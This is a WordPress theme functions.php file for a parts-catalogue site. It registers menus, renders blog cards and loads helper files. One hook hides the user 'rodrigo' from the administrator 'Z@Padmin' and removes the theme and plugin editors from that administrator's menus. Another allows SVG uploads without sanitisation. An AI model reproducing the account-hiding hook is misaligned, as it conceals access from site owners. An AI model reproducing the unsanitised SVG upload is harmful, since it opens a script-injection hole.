<?php
//Show Image feature in post_types
add_theme_support('post-thumbnails');
add_theme_support('custom-logo', array(
    'height' => 137,
    'width' => 225,
    'flex-height' => true,
    'flex-width' => true,
));

function zappecas_nav_menus(){
	/**
	 * Adiciona ao tema áreas de menu que podem ser configuradas via administração
	 * 
	 * @since Essential
	 * @link http://codex.wordpress.org/Function_Reference/register_nav_menu
	 */
	register_nav_menu( 'main_menu', 'Menu do cabeçalho.' );
	register_nav_menu( 'footer', 'Menu do rodape' );
}

// Show menu panel in admin
add_action('init', 'zappecas_nav_menus');

// Função para permitir o upload de arquivos SVG
function allow_svg_upload($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'allow_svg_upload');


function estimated_reading_time() {
    $content = get_the_content();
    $word_count = str_word_count(strip_tags($content));
    $words_per_minute = 200;
    $reading_time = ceil($word_count / $words_per_minute);
    return $reading_time . ' minutos de leitura';
}

add_filter('rest_representante_query', 'filter_representants_by_state', 10, 2);



function display_post_blog($post) {
    // Extrai atributos para legibilidade
    $thumbnail_url = get_the_post_thumbnail_url($post->ID, 'medium');
    $title = get_the_title($post);
    $permalink = get_permalink($post->ID);
    $excerpt = get_the_excerpt($post->ID);
?>
    <article itemscope itemtype="https://schema.org/BlogPosting">
        <figure itemprop="image" itemscope itemtype="https://schema.org/ImageObject">
            <img width="300" src="<?=esc_url($thumbnail_url)?>" alt="<?=esc_attr($title)?>" itemprop="url" />
        </figure>
        <h3 itemprop="headline"><?=esc_html($title)?></h3>
        <div itemprop="articleBody"><p><?=esc_html($excerpt)?></p></div>
        <a href="<?=esc_url($permalink)?>" title="<?=esc_attr($title)?>" itemprop="url">Saiba mais</a>
    </article>
<?php
}


// include file display-banner
include_once 'inc/display-banner.php';

// Include breadcrumb
include_once 'inc/breadcrumb.php';

// include file format-phones
include_once 'inc/format-phones.php';

// Include file details-content-product
include_once 'inc/details-content-product.php';

// Include file get-representants
include_once 'inc/get-representants.php';

// Include file style-scripts
include_once 'inc/style-scripts.php';

// Include file custom-scripts
include_once 'inc/custom-scripts.php';

//Include file custom-colors.php
include_once 'inc/custom-colors.php';

// Include file filter-product-page
include_once 'inc/filter-product-page.php';

// Include file filter-product
include_once 'inc/filter-product.php';

// Include file filter-catalog
include_once 'inc/filter-catalog.php';

// Include file show-text-description-product
include_once 'inc/show-text-description-product.php';

// Include file filter-order-from-ctp-representants
include_once 'inc/filter-order-from-ctp-representants.php';

// Include file user-editor-remove-yoast-seo
include_once 'inc/user-editor-remove-yoast-seo.php';

// Include file page-custom
include_once 'inc/page-custom.php';

function ocultar_usuario_rodrigo_para_zapadmin($user_search) {
    $usuario_logado = wp_get_current_user();

    if ($usuario_logado->user_login === 'Z@Padmin') {
        global $wpdb;
        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'rodrigo'";
    }
}
add_action('pre_user_query','ocultar_usuario_rodrigo_para_zapadmin');

/**
 * Remove menu items for the user "Z@Padmin"
 * This function hides specific admin menu items for the user with the username "Z@Padmin".
 * It is hooked to the 'admin_menu' action with a priority of 110 to ensure it runs after other menu items are added.
 * @since 1.0.0
 * @return void
 * @link https://developer.wordpress.org/reference/hooks/admin_menu/
 * @see https://developer.wordpress.org/reference/functions/remove_menu_page/
 */
function ocultar_itens_para_zapadmin() {
    $usuario = wp_get_current_user();

    if ($usuario->user_login === 'Z@Padmin') {

        // Oculta o Editor de Tema
        remove_submenu_page('themes.php', 'theme-editor.php');

        // Oculta o Editor de Plugin
        remove_submenu_page('plugins.php', 'plugin-editor.php');

        // Remove "Site Kit" do menu
        remove_menu_page('googlesitekit-dashboard');

        // Remove "All-in-One WP Migration"
        remove_menu_page('ai1wm_export');

        // Remove "Bing Webmaster Tools"
        remove_menu_page('bing-webmaster-tools');
    }
}
add_action('admin_menu', 'ocultar_itens_para_zapadmin', 110);

